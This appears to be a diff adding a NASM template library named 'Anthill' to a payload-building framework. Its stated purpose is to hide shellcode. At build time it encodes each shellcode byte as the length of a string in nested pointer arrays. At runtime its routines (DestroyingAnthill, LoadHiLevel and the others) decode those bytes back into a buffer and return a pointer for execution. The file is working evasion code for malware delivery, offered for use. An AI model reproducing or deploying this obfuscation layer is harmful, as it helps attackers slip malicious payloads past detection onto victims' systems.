@@ -1,0 +1,209 @@
+#!name##Anthill
+#!devitem##True
+#!itemType##support
+#!info##New nasm library to hide shellcode
+#!lang##nasm
+#!fileType##lib
+#!hiveType##lib
+#!addNameComp##True
+#!modProcess##PAYLOAD##BUILD_CODE##COMPILE
+#!modCompiler##Basic-Nasm
+#!payloadSpace##ATL_scode##Shellcode to hide
+#!Var##ATL_buffer##1024##Buffer for shellcode. Must be larger than shellcode size. Values ​​are in kilobytes.##str
+
+
+
+{% set ANT_sc = scTOOL.PutShellcode(ATL_scode) %}
+
+
+
+
+%define KILO_BYTES 1024
+%define ANTHILL_MASTER_BUFFER {{ATL_buffer}} * KILO_BYTES
+
+global ResetIndex
+global DecodeByte
+global OpenBag
+global DestroyingAnthill
+
+
+bits 64
+default rel
+
+
+
+section .data
+    ; place for shellcode
+{{scTOOL.OneCharShadow(ANT_sc)}}
+
+section .bss
+    main_index: resq 1      ; main index
+    anthill_bag: resb ANTHILL_MASTER_BUFFER      ; shellcode buffer
+
+section .text
+
+DestroyingAnthill:
+; decode shellcode and return pointer to shellcode
+; OUT: RAX - pointer to buffer
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 40
+    call ResetIndex
+    lea rcx, [col]
+    call LoadHiLevel
+    add rsp, 40
+    lea rax, [anthill_bag]
+    
+    pop rbp
+    ret
+
+
+OpenBag:
+; Return a pointer to anthill_bag
+;   OUT: rax - pointer to buffer
+    push rbp
+    mov rbp, rsp
+    
+    lea rax, [anthill_bag]
+    
+    pop rbp
+    ret
+
+
+DecodeByte:
+;   IN: RCX - pointer to variable
+;   OUT: RAX - byte
+    push rbp
+    mov rbp, rsp
+    push rbx
+    
+    
+    
+    xor rax, rax    ; counter
+    xor rbx, rbx    ; temp
+    .check_loop:
+        mov bl, [rcx + rax]
+        cmp bl, 0
+        je .return
+        inc rax
+        jmp .check_loop
+    
+    .return:
+        pop rbx
+        pop rbp
+        ret
+
+ResetIndex:
+; reset main index
+    push rbp
+    mov rbp, rsp
+    push rcx
+    
+    
+    lea rcx, [main_index]
+    mov qword [rcx], 0
+    
+    pop rcx
+    pop rbp
+    ret
+
+LoadHiLevel:
+; IN: RCX - a pointer to an array containing arrays ( master)
+    push rbp
+    mov rbp, rsp
+    push r8
+    push r9
+    
+    mov r8, rcx     ; array pointer
+    xor r9, r9  ; counter
+    
+    sub rsp, 40
+    .copy_loop:
+        mov rcx, [r8 + 8 * r9]
+        cmp rcx, 0
+        je .end_copy
+        call LoadMedLevel
+        inc r9  ; counter + 1
+        jmp .copy_loop
+    
+    .end_copy:
+        add rsp, 40
+        
+    
+    .return:
+        pop r9
+        pop r8
+        pop rbp
+        ret
+
+LoadMedLevel:
+;   IN: RCX - a pointer to an array containing arrays ( hi level)
+    push rbp
+    mov rbp, rsp
+    push r8
+    push r9
+    
+    mov r8, rcx     ; array pointer
+    xor r9, r9  ; counter
+    
+    sub rsp, 40
+    .copy_loop:
+        mov rcx, [r8 + 8 * r9]
+        cmp rcx, 0
+        je .end_copy
+        call LoadLowLevel
+        inc r9  ; counter + 1
+        jmp .copy_loop
+    
+    .end_copy:
+        add rsp, 40
+        
+    
+    .return:
+        pop r9
+        pop r8
+        pop rbp
+        ret
+
+LoadLowLevel:
+;   IN: RCX - A pointer to an array containing byte pointers. (med level)
+    push rbp
+    mov rbp, rsp
+    push r8
+    push r9
+    push rbx
+    push rdx
+    push rsi
+    
+    mov r8, rcx     ; Array pointer
+    lea r9, [main_index]    ; main index pointer
+    mov rbx, [r9]   ; main index
+    xor rdx, rdx    ; counter
+    lea rsi, [anthill_bag]  ; shellcode buffer
+    
+    sub rsp, 40
+    .copy_loop:
+        mov rcx, [r8 + 8 * rdx]
+        cmp rcx, 0
+        je .end_copy
+        call DecodeByte
+        mov byte [rsi + rbx], al   ; put byte in shellcode buffer
+        inc rbx     ; main index + 1
+        inc rdx     ; counter + 1
+        jmp .copy_loop
+        
+    
+    .end_copy:
+        add rsp, 40
+        mov [r9], rbx   ; update main index
+        
+    .return:
+        pop rsi
+        pop rdx
+        pop rbx
+        pop r9
+        pop r8
+        pop rbp
+        ret
+    
